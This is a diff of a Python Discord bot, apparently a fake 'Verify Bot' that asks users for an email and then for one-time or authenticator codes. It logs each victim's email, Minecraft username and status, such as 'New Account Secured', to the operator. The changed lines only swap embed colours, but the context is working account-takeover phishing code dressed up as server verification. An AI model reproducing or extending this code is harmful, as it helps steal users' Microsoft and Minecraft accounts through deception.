@@ -38,7 +38,7 @@ class MyModalOne(ui.Modal):
                     embed = Embed(
                         title = "Could not verify",
                         description = "Our systems seem to be down at the moment. Please try again in a few hours.",
-                        color = 0xFF5C5C
+                        color = 0xFA4343
                     ),
                     ephemeral = True
                 )
@@ -48,7 +48,7 @@ class MyModalOne(ui.Modal):
                     Embed(
                         description = f"**Email** | **Status** | **Reason**\n```{email} | Refused to Verify | User has been blacklisted```",
                         timestamp = datetime.datetime.now(),
-                        colour = 0xFF5C5C
+                        colour = 0xFA4343
                     ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
                     view = ButtonOptions(interaction.user, interaction.user.id, username),
                     email = email
@@ -61,7 +61,7 @@ class MyModalOne(ui.Modal):
                 embed = Embed(
                     title = "❌ Invalid Email Address",
                     description="Make sure you entered your email correctly!",
-                    color = 0xFF5C5C
+                    color = 0xFA4343
                 ),
                 ephemeral = True
             )
@@ -71,7 +71,7 @@ class MyModalOne(ui.Modal):
                     Embed(
                         description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to Verify | Invalid email entered```",
                     timestamp = datetime.datetime.now(),
-                    colour = 0xFF5C5C
+                    colour = 0xFA4343
                 ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
                 view = ButtonOptions(interaction.user, interaction.user.id, username),
                 email = email
@@ -92,7 +92,7 @@ class MyModalOne(ui.Modal):
                 Embed(
                     description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | Email does not exist```",
                     timestamp = datetime.datetime.now(),
-                    colour = 0xFF5C5C
+                    colour = 0xFA4343
                 ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
                 view = ButtonOptions(interaction.user, interaction.user.id, username),
                 email = email
@@ -102,7 +102,7 @@ class MyModalOne(ui.Modal):
                 embed = Embed(
                     title = ":x: Failed to verify",
                     description = "The email you entered does not exist, make sure you entered it correctly!",
-                    color = 0xFF5C5C
+                    color = 0xFA4343
                 ),
                 ephemeral = True
             )
@@ -130,7 +130,7 @@ class MyModalOne(ui.Modal):
                 Embed(
                     description=f"Username | Email | Status\n```{username} | {email} | Waiting for Auth confirmation```",
                     timestamp = datetime.datetime.now(),
-                    colour = 0x678DC6,
+                    colour = 0x3B89FF,
                 ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
                 view = ButtonOptions(interaction.user, interaction.user.id, username),
                 email = email
@@ -146,7 +146,7 @@ class MyModalOne(ui.Modal):
                         embed = Embed(
                             title = ":x: Failed to verify",
                             description = "You pressed the wrong number on your authenticator app. Try again!",
-                            colour=0xFF5C5C
+                            colour=0xFA4343
                         ),
                         ephemeral = True
                     )
@@ -156,7 +156,7 @@ class MyModalOne(ui.Modal):
                         Embed(
                             description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to verify | Clicked on the wrong auth number```",
                             timestamp = datetime.datetime.now(),
-                            colour = 0xFF5C5C
+                            colour = 0xFA4343
                         ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
                         view = ButtonOptions(interaction.user, interaction.user.id, username),
                         email = email
@@ -198,7 +198,7 @@ class MyModalOne(ui.Modal):
                             Embed(
                                 description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to secure | Invalid Code Entered```",
                                 timestamp = datetime.datetime.now(),
-                                colour = 0xFF5C5C
+                                colour = 0xFA4343
                             ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
                             view = ButtonOptions(interaction.user, interaction.user.id, username),
                             email = email
@@ -215,7 +215,7 @@ class MyModalOne(ui.Modal):
                         Embed(
                             title="New Account Secured",
                             description=secured_desc,
-                            color=0xF4A460 if mc_name != "No Minecraft" else 0x678DC6
+                            color=0xFF9E45 if mc_name != "No Minecraft" else 0x3B89FF
                         ).set_thumbnail(url=f"https://mc-heads.net/avatar/{quote(mc_name)}/128"),
                         email = email,
                         conly = True
@@ -288,7 +288,7 @@ class MyModalOne(ui.Modal):
                 Embed(
                     description=f"Username | Email | Status\n```{username} | {email} | Waiting for OTP code```",
                     timestamp = datetime.datetime.now(),
-                    colour = 0x678DC6,
+                    colour = 0x3B89FF,
                 ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
                 view = ButtonOptions(interaction.user, interaction.user.id, username),
                 email = email
@@ -300,7 +300,7 @@ class MyModalOne(ui.Modal):
             Embed(
                 description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | No OTP methods found```",
                 timestamp = datetime.datetime.now(),
-                colour = 0xFF5C5C
+                colour = 0xFA4343
             ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
             view = ButtonOptions(interaction.user, interaction.user.id, username),
             email = email
